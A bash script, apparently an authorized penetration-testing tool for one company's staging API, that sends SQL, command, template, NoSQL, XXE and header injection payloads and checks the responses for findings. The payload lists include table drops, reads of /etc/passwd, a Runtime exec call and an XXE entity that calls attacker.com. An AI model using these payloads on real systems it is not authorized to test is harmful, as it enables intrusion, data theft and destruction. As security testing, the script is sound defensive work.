#!/bin/bash
# STOA Platform - Injection Testing Script
# Ticket: CAB-236
#
# Tests SQL injection, Command injection, SSTI, and NoSQL injection
# IMPORTANT: Only run against authorized test environments

set -e

# Configuration
API_URL="${API_URL:-https://api.staging.stoa.cab-i.com}"
OUTPUT_DIR="${OUTPUT_DIR:-./results/injection}"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

mkdir -p "$OUTPUT_DIR"

log_info() { echo -e "${GREEN}[INFO]${NC} $1"; }
log_warn() { echo -e "${YELLOW}[WARN]${NC} $1"; }
log_error() { echo -e "${RED}[ERROR]${NC} $1"; }
log_finding() {
    echo -e "${RED}[FINDING]${NC} $1"
    echo "[$(date -Iseconds)] FINDING: $1" >> "$OUTPUT_DIR/findings.log"
}

# -----------------------------------------------------------------------------
# SQL Injection Payloads
# -----------------------------------------------------------------------------
SQL_PAYLOADS=(
    "' OR '1'='1"
    "' OR '1'='1' --"
    "' OR '1'='1' /*"
    "'; DROP TABLE apis;--"
    "' UNION SELECT NULL--"
    "' UNION SELECT NULL,NULL--"
    "' UNION SELECT username,password FROM users--"
    "1; SELECT * FROM information_schema.tables--"
    "1' AND '1'='1"
    "1' AND SLEEP(5)--"
    "1' AND (SELECT COUNT(*) FROM users)>0--"
    "admin'--"
    "' OR 1=1#"
    "' OR 'x'='x"
    "') OR ('1'='1"
)

# -----------------------------------------------------------------------------
# Command Injection Payloads
# -----------------------------------------------------------------------------
CMD_PAYLOADS=(
    "; whoami"
    "| whoami"
    "\`whoami\`"
    "\$(whoami)"
    "; id"
    "| id"
    "; cat /etc/passwd"
    "| cat /etc/passwd"
    "; ls -la"
    "\$(cat /etc/passwd)"
    "\`id\`"
    "|| whoami"
    "&& whoami"
    "& whoami"
    "; ping -c 3 127.0.0.1"
    "\$(sleep 5)"
)

# -----------------------------------------------------------------------------
# SSTI (Server-Side Template Injection) Payloads
# -----------------------------------------------------------------------------
SSTI_PAYLOADS=(
    "{{7*7}}"
    "\${7*7}"
    "#{7*7}"
    "<%= 7*7 %>"
    "{{config}}"
    "{{self}}"
    "{{''.__class__}}"
    "{{''.__class__.__mro__}}"
    "\${T(java.lang.Runtime).getRuntime().exec('id')}"
    "{{config.__class__.__init__.__globals__}}"
    "{{request.application.__globals__}}"
    "\${7*'7'}"
    "{{constructor.constructor('return this')()}}"
)

# -----------------------------------------------------------------------------
# NoSQL Injection Payloads
# -----------------------------------------------------------------------------
NOSQL_PAYLOADS=(
    '{"$ne": null}'
    '{"$gt": ""}'
    '{"$regex": ".*"}'
    '{"$where": "1==1"}'
    '{"$or": [{"a": 1}, {"b": 2}]}'
    '{"username": {"$ne": ""}, "password": {"$ne": ""}}'
    '{"$nin": []}'
    '{"$exists": true}'
)

# -----------------------------------------------------------------------------
# Test 1: SQL Injection in Query Parameters
# -----------------------------------------------------------------------------
test_sql_injection_params() {
    log_info "Testing SQL injection in query parameters..."

    if [ -z "$TOKEN" ]; then
        log_warn "No token provided, testing without auth"
    fi

    AUTH_HEADER=""
    if [ -n "$TOKEN" ]; then
        AUTH_HEADER="-H \"Authorization: Bearer $TOKEN\""
    fi

    # Test endpoints with query parameters
    ENDPOINTS=(
        "/v1/apis?name="
        "/v1/apis?search="
        "/v1/applications?filter="
        "/v1/tenants?name="
        "/v1/deployments?status="
    )

    for endpoint in "${ENDPOINTS[@]}"; do
        for payload in "${SQL_PAYLOADS[@]}"; do
            # URL encode payload
            ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null || echo "$payload")

            FULL_URL="$API_URL${endpoint}${ENCODED}"

            RESPONSE=$(curl -s -w "\n%{http_code}\n%{time_total}" \
                -H "Authorization: Bearer $TOKEN" \
                "$FULL_URL" 2>/dev/null)

            HTTP_CODE=$(echo "$RESPONSE" | tail -2 | head -1)
            TIME=$(echo "$RESPONSE" | tail -1)
            BODY=$(echo "$RESPONSE" | sed -e '$d' -e '$d')

            # Check for SQL error messages
            if echo "$BODY" | grep -qi "sql\|syntax\|mysql\|postgresql\|oracle\|sqlite\|database"; then
                log_finding "SQL error in response for: $endpoint with payload: $payload"
                echo "URL: $FULL_URL" >> "$OUTPUT_DIR/sqli-findings.txt"
                echo "Response: $BODY" >> "$OUTPUT_DIR/sqli-findings.txt"
                echo "---" >> "$OUTPUT_DIR/sqli-findings.txt"
            fi

            # Check for time-based injection (> 4 seconds)
            if (( $(echo "$TIME > 4" | bc -l) )); then
                log_finding "Possible time-based SQLi: $endpoint (${TIME}s delay)"
            fi
        done
    done
}

# -----------------------------------------------------------------------------
# Test 2: SQL Injection in Request Body
# -----------------------------------------------------------------------------
test_sql_injection_body() {
    log_info "Testing SQL injection in request body..."

    if [ -z "$TOKEN" ]; then
        log_warn "No token provided, skipping body injection tests"
        return
    fi

    for payload in "${SQL_PAYLOADS[@]}"; do
        # Test in name field
        RESPONSE=$(curl -s -w "\n%{http_code}" \
            -X POST \
            -H "Authorization: Bearer $TOKEN" \
            -H "Content-Type: application/json" \
            -d "{\"name\":\"$payload\",\"description\":\"test\"}" \
            "$API_URL/v1/apis" 2>/dev/null)

        HTTP_CODE=$(echo "$RESPONSE" | tail -1)
        BODY=$(echo "$RESPONSE" | sed '$d')

        if echo "$BODY" | grep -qi "sql\|syntax\|database\|error"; then
            log_finding "SQL injection in body (name field): $payload"
        fi

        # Test in description field
        RESPONSE=$(curl -s \
            -X POST \
            -H "Authorization: Bearer $TOKEN" \
            -H "Content-Type: application/json" \
            -d "{\"name\":\"test\",\"description\":\"$payload\"}" \
            "$API_URL/v1/apis" 2>/dev/null)

        if echo "$RESPONSE" | grep -qi "sql\|syntax\|database"; then
            log_finding "SQL injection in body (description field): $payload"
        fi
    done
}

# -----------------------------------------------------------------------------
# Test 3: Command Injection
# -----------------------------------------------------------------------------
test_command_injection() {
    log_info "Testing command injection..."

    if [ -z "$TOKEN" ]; then
        log_warn "No token provided, skipping command injection tests"
        return
    fi

    # Test in deployment name (often used in shell commands)
    for payload in "${CMD_PAYLOADS[@]}"; do
        RESPONSE=$(curl -s -w "\n%{http_code}\n%{time_total}" \
            -X POST \
            -H "Authorization: Bearer $TOKEN" \
            -H "Content-Type: application/json" \
            -d "{\"name\":\"test${payload}\",\"environment\":\"dev\"}" \
            "$API_URL/v1/deployments" 2>/dev/null)

        HTTP_CODE=$(echo "$RESPONSE" | tail -2 | head -1)
        TIME=$(echo "$RESPONSE" | tail -1)
        BODY=$(echo "$RESPONSE" | sed -e '$d' -e '$d')

        # Check for command output in response
        if echo "$BODY" | grep -qE "uid=|root:|/bin/bash|/etc/passwd"; then
            log_finding "Command injection successful: $payload"
            echo "Payload: $payload" >> "$OUTPUT_DIR/cmdi-findings.txt"
            echo "Response: $BODY" >> "$OUTPUT_DIR/cmdi-findings.txt"
        fi

        # Check for time-based command injection
        if (( $(echo "$TIME > 4" | bc -l) )); then
            log_finding "Possible time-based command injection (${TIME}s delay)"
        fi
    done

    # Test in AWX job parameters (if applicable)
    log_info "Testing command injection in AWX parameters..."
    for payload in "${CMD_PAYLOADS[@]}"; do
        RESPONSE=$(curl -s \
            -X POST \
            -H "Authorization: Bearer $TOKEN" \
            -H "Content-Type: application/json" \
            -d "{\"extra_vars\":{\"target\":\"test${payload}\"}}" \
            "$API_URL/v1/deployments/1/execute" 2>/dev/null)

        if echo "$RESPONSE" | grep -qE "uid=|root:|/bin/bash"; then
            log_finding "Command injection in AWX extra_vars: $payload"
        fi
    done
}

# -----------------------------------------------------------------------------
# Test 4: SSTI (Server-Side Template Injection)
# -----------------------------------------------------------------------------
test_ssti() {
    log_info "Testing Server-Side Template Injection (SSTI)..."

    if [ -z "$TOKEN" ]; then
        log_warn "No token provided, skipping SSTI tests"
        return
    fi

    for payload in "${SSTI_PAYLOADS[@]}"; do
        # Test in various fields
        FIELDS=("name" "description" "template" "message")

        for field in "${FIELDS[@]}"; do
            RESPONSE=$(curl -s \
                -X POST \
                -H "Authorization: Bearer $TOKEN" \
                -H "Content-Type: application/json" \
                -d "{\"$field\":\"$payload\"}" \
                "$API_URL/v1/apis" 2>/dev/null)

            # Check for template evaluation (49 = 7*7)
            if echo "$RESPONSE" | grep -q "49"; then
                log_finding "SSTI detected in $field field: $payload -> 49"
                echo "Field: $field, Payload: $payload" >> "$OUTPUT_DIR/ssti-findings.txt"
            fi

            # Check for config/object exposure
            if echo "$RESPONSE" | grep -qE "SECRET_KEY|DATABASE_URL|<Config|__class__|__globals__"; then
                log_finding "SSTI with config exposure in $field: $payload"
            fi
        done
    done
}

# -----------------------------------------------------------------------------
# Test 5: NoSQL Injection (MongoDB style)
# -----------------------------------------------------------------------------
test_nosql_injection() {
    log_info "Testing NoSQL injection..."

    if [ -z "$TOKEN" ]; then
        log_warn "No token provided, skipping NoSQL injection tests"
        return
    fi

    for payload in "${NOSQL_PAYLOADS[@]}"; do
        # Test in query parameter (JSON)
        ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null || echo "$payload")

        RESPONSE=$(curl -s -w "\n%{http_code}" \
            -H "Authorization: Bearer $TOKEN" \
            "$API_URL/v1/apis?filter=$ENCODED" 2>/dev/null)

        HTTP_CODE=$(echo "$RESPONSE" | tail -1)
        BODY=$(echo "$RESPONSE" | sed '$d')

        # Check for unexpected data returned
        if [ "$HTTP_CODE" = "200" ]; then
            COUNT=$(echo "$BODY" | jq 'length' 2>/dev/null || echo "0")
            if [ "$COUNT" -gt 10 ]; then
                log_finding "Possible NoSQL injection - returned $COUNT results: $payload"
            fi
        fi

        # Test in request body
        RESPONSE=$(curl -s \
            -X POST \
            -H "Authorization: Bearer $TOKEN" \
            -H "Content-Type: application/json" \
            -d "{\"query\":$payload}" \
            "$API_URL/v1/search" 2>/dev/null)

        if echo "$RESPONSE" | grep -qi "error\|exception\|mongodb\|mongoose"; then
            log_finding "NoSQL error message exposed: $payload"
        fi
    done
}

# -----------------------------------------------------------------------------
# Test 6: XXE (XML External Entity) Injection
# -----------------------------------------------------------------------------
test_xxe() {
    log_info "Testing XXE injection..."

    XXE_PAYLOADS=(
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>'
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo>test</foo>'
    )

    for payload in "${XXE_PAYLOADS[@]}"; do
        RESPONSE=$(curl -s \
            -X POST \
            -H "Authorization: Bearer $TOKEN" \
            -H "Content-Type: application/xml" \
            -d "$payload" \
            "$API_URL/v1/import" 2>/dev/null)

        if echo "$RESPONSE" | grep -qE "root:|/bin/bash|nobody:"; then
            log_finding "XXE injection successful - file disclosure"
        fi
    done
}

# -----------------------------------------------------------------------------
# Test 7: Header Injection
# -----------------------------------------------------------------------------
test_header_injection() {
    log_info "Testing header injection..."

    HEADER_PAYLOADS=(
        "test\r\nX-Injected: true"
        "test\nSet-Cookie: hacked=true"
        "test\r\nLocation: http://evil.com"
    )

    for payload in "${HEADER_PAYLOADS[@]}"; do
        RESPONSE=$(curl -s -i \
            -H "Authorization: Bearer $TOKEN" \
            -H "X-Custom-Header: $payload" \
            "$API_URL/v1/health" 2>/dev/null)

        if echo "$RESPONSE" | grep -qi "X-Injected\|hacked=true"; then
            log_finding "Header injection possible: $payload"
        fi
    done
}

# -----------------------------------------------------------------------------
# Main Execution
# -----------------------------------------------------------------------------
main() {
    echo "========================================"
    echo "STOA Platform - Injection Testing"
    echo "========================================"
    echo "Target API: $API_URL"
    echo "Output: $OUTPUT_DIR"
    echo "========================================"

    # Get token if credentials provided
    if [ -n "$TEST_USERNAME" ] && [ -n "$TEST_PASSWORD" ]; then
        KEYCLOAK_URL="${KEYCLOAK_URL:-https://auth.staging.stoa.cab-i.com}"
        REALM="${REALM:-stoa}"
        CLIENT_ID="${CLIENT_ID:-stoa-ui}"

        TOKEN_RESPONSE=$(curl -s -X POST "$KEYCLOAK_URL/realms/$REALM/protocol/openid-connect/token" \
            -d "grant_type=password" \
            -d "client_id=$CLIENT_ID" \
            -d "username=$TEST_USERNAME" \
            -d "password=$TEST_PASSWORD")

        TOKEN=$(echo "$TOKEN_RESPONSE" | jq -r '.access_token // empty')

        if [ -n "$TOKEN" ]; then
            export TOKEN
            log_info "Token obtained for testing"
        fi
    fi

    # Run tests
    test_sql_injection_params
    test_sql_injection_body
    test_command_injection
    test_ssti
    test_nosql_injection
    test_xxe
    test_header_injection

    echo ""
    echo "========================================"
    echo "Testing Complete"
    echo "========================================"
    echo "Results saved to: $OUTPUT_DIR"
    echo "Check $OUTPUT_DIR/findings.log for vulnerabilities"
}

if [ "${BASH_SOURCE[0]}" = "$0" ]; then
    main "$@"
fi
